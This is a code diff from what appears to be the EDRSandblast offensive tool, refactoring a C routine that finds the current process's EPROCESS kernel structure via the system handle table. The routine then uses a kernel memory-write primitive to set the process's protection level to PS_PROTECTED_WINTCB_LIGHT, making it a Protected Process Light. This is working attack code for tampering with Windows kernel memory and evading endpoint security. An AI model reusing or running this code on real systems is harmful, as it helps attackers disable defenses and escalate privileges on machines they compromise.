@@ -6,8 +6,10 @@
 */
 #include <tchar.h>
 
+#include "../EDRSandblast.h"
 #include "KernelMemoryPrimitives.h"
 #include "NtoskrnlOffsets.h"
+#include "Undoc.h"
 #include "RunAsPPL.h"
 
 DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
@@ -17,19 +19,19 @@ DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
     // Open an handle to our own process.
     HANDLE selfProcessHandle = OpenProcess(SYNCHRONIZE, FALSE, currentProcessID);
     if (verbose) {
-        _tprintf(TEXT("[*] Self process handle: 0x%hx\n"), (USHORT)((ULONG_PTR)selfProcessHandle));
+        _tprintf_or_not(TEXT("[*] [ProcessProtection] Self process handle: 0x%hx\n"), (USHORT)((ULONG_PTR)selfProcessHandle));
     }
 
 
     // Retrieves the native NtQuerySystemInformation function from ntdll.
     HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
     if (!hNtdll) {
-        _tprintf(TEXT("[!] ERROR: could not open an handle to ntdll to find the EPROCESS struct of the current process\n"));
+        _putts_or_not(TEXT("[!] ERROR: could not open an handle to ntdll to find the EPROCESS struct of the current process"));
         return 0x0;
     }
     _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
     if (!NtQuerySystemInformation) {
-        _tprintf(TEXT("[!] ERROR: could not retrieve NtQuerySystemInformation function to find the EPROCESS struct of the current process\n"));
+        _putts_or_not(TEXT("[!] ERROR: could not retrieve NtQuerySystemInformation function to find the EPROCESS struct of the current process"));
         return 0x0;
     }
 
@@ -42,7 +44,7 @@ DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
     PSYSTEM_HANDLE_INFORMATION tmpHandleTableInformation = NULL;
     PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(SystemHandleInformationSize);
     if (!pHandleTableInformation) {
-        _tprintf(TEXT("[!] ERROR: could not allocate memory for the handle table to find the EPROCESS struct of the current process\n"));
+        _putts_or_not(TEXT("[!] ERROR: could not allocate memory for the handle table to find the EPROCESS struct of the current process"));
         return 0x0;
     }
     status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
@@ -50,14 +52,14 @@ DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
         SystemHandleInformationSize = SystemHandleInformationSize * 2;
         tmpHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)realloc(pHandleTableInformation, SystemHandleInformationSize);
         if (!tmpHandleTableInformation) {
-            _tprintf(TEXT("[!] ERROR: could not realloc memory for the handle table to find the EPROCESS struct of the current process\n"));
+            _putts_or_not(TEXT("[!] ERROR: could not realloc memory for the handle table to find the EPROCESS struct of the current process"));
             return 0x0;
         }
         pHandleTableInformation = tmpHandleTableInformation;
         status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
     }
     if (!NT_SUCCESS(status)) {
-        _tprintf(TEXT("[!] ERROR: could not retrieve the HandleTableInformation to find the EPROCESS struct of the current process\n"));
+        _putts_or_not(TEXT("[!] ERROR: could not retrieve the HandleTableInformation to find the EPROCESS struct of the current process"));
         return 0x0;
     }
 
@@ -71,13 +73,10 @@ DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
             continue;
         }
 
-        if (verbose) {
-            _tprintf(TEXT("[*] Handle for the current process (PID: %hd): 0x%hx at 0x%I64x\n"), handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
-        }
-
         if (handleInfo.HandleValue == (USHORT)((ULONG_PTR)selfProcessHandle)) {
-            _tprintf(TEXT("[+] Found the handle of the current process (PID: %hd): 0x%hx at 0x%I64x\n"), handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
+            _tprintf_or_not(TEXT("[+] [ProcessProtection] Found the handle of the current process (PID: %hu): 0x%hx at 0x%I64x\n"), handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
             returnAddress = (DWORD64)handleInfo.Object;
+            break;
         }
     }
     free(pHandleTableInformation);
@@ -86,24 +85,20 @@ DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
 }
 
 int SetCurrentProcessAsProtected(BOOL verbose) {
-    HANDLE Device = GetDriverHandle();
     DWORD64 processEPROCESSAddress = GetSelfEPROCESSAddress(verbose);
     if (processEPROCESSAddress == 0x0) {
-        _tprintf(TEXT("[!] ERROR: could not find the EPROCCES struct of the current process to self protect\n"));
-        CloseHandle(Device);
+        _putts_or_not(TEXT("[!] ERROR: could not find the EPROCCES struct of the current process to self protect"));
         return -1;
     }
-    _tprintf(TEXT("[+] Found self process EPROCCES struct at 0x%I64x\n"), processEPROCESSAddress);
+    _tprintf_or_not(TEXT("[+] [ProcessProtection] Found self process EPROCCES struct at 0x%I64x\n"), processEPROCESSAddress);
 
     // Sets the current process EPROCESS's ProtectionLevel as Light WinTcb (PS_PROTECTED_WINTCB_LIGHT, currently 0x61).
-    DWORD64 processSignatureLevelAddress = processEPROCESSAddress + ntoskrnlOffsets.st.ps_protection;
-    // DWORD64 processSignatureLevelAddress = 0xffffe481d073a080 + offsets.st.ps_protection;
+    DWORD64 processSignatureLevelAddress = processEPROCESSAddress + g_ntoskrnlOffsets.st.eprocess_protection;
+    // DWORD64 processSignatureLevelAddress = 0xffffe481d073a080 + offsets.st.eprocess_protection;
 
     UCHAR flagPPLWinTcb = ((UCHAR)((PsProtectedSignerWinTcb) << 4)) | ((UCHAR)(PsProtectedTypeProtectedLight));
-    _tprintf(TEXT("[*] Protecting own process by setting the EPROCESS's ProtectionLevel (at 0x%I64x) to 0x%hx (PS_PROTECTED_WINTCB_LIGHT)\n"), processSignatureLevelAddress, flagPPLWinTcb);
-    WriteMemoryWORD(Device, processSignatureLevelAddress, flagPPLWinTcb);
-
-    CloseHandle(Device);
+    _tprintf_or_not(TEXT("[*] [ProcessProtection] Protecting own process by setting the EPROCESS's ProtectionLevel (at 0x%I64x) to 0x%hx (PS_PROTECTED_WINTCB_LIGHT)\n"), processSignatureLevelAddress, flagPPLWinTcb);
+    WriteMemoryWORD(processSignatureLevelAddress, flagPPLWinTcb);
 
     return 0;
 }
